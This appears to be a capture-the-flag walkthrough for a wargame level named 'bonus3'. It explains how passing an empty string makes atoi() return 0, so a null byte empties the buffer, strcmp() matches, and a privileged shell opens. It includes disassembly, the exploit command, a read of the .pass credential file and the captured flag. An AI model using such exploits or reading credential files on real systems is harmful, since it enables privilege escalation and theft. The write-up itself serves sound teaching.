@@ -1,0 +1,81 @@
+# Bonus3 - Logic Bug via atoi() and strcmp()
+
+---
+
+# PART 1: Walkthrough
+
+## Step 1: Test the program
+
+```bash
+./bonus3
+# No output
+
+./bonus3 test
+# No output
+
+./bonus3 ""
+$ whoami
+end
+```
+
+Program accepts empty string and gives shell as `end` user!
+
+## Step 2: Analyze with GDB
+
+```bash
+gdb bonus3
+(gdb) disas main
+```
+
+**Key findings:**
+- Opens `/home/user/end/.pass` with `fopen()`
+- Requires exactly 2 arguments (argc == 2)
+- Reads 66 bytes (0x42) from password file into buffer
+- Converts `argv[1]` to integer with `atoi()`
+- Sets `buffer[atoi(argv[1])] = '\0'` (null byte injection)
+- Reads another 65 bytes (0x41) into `buffer+0x42`
+- Compares `buffer` with `argv[1]` using `strcmp()`
+- If equal → executes `execl("/bin/sh", "sh", 0)`
+- If not equal → prints `buffer+0x42`
+
+## Step 3: Understanding the vulnerability
+
+**Critical instructions:**
+```asm
+0x08048584 <+144>: call   0x8048430 <atoi@plt>
+0x08048589 <+149>: movb   $0x0,0x18(%esp,%eax,1)
+```
+
+Translates to: `buffer[atoi(argv[1])] = '\0'`
+
+**Key behavior of atoi():**
+```c
+atoi("123") = 123
+atoi("0") = 0
+atoi("abc") = 0
+atoi("") = 0  // Empty string returns 0!
+```
+
+## Step 4: The exploit logic
+
+**When argv[1] is empty string "":**
+
+1. `atoi("") = 0`
+2. `buffer[0] = '\0'` → Buffer now starts with null byte
+3. Buffer becomes effectively empty string
+4. `strcmp(buffer, argv[1])` → `strcmp("", "")`
+5. Empty strings match! → strcmp returns 0
+6. Condition passes → `execl("/bin/sh", "sh", 0)`
+7. Shell as `end` user!
+
+## Step 5: Execute the exploit
+
+```bash
+./bonus3 ""
+$ whoami
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+```
+
+---
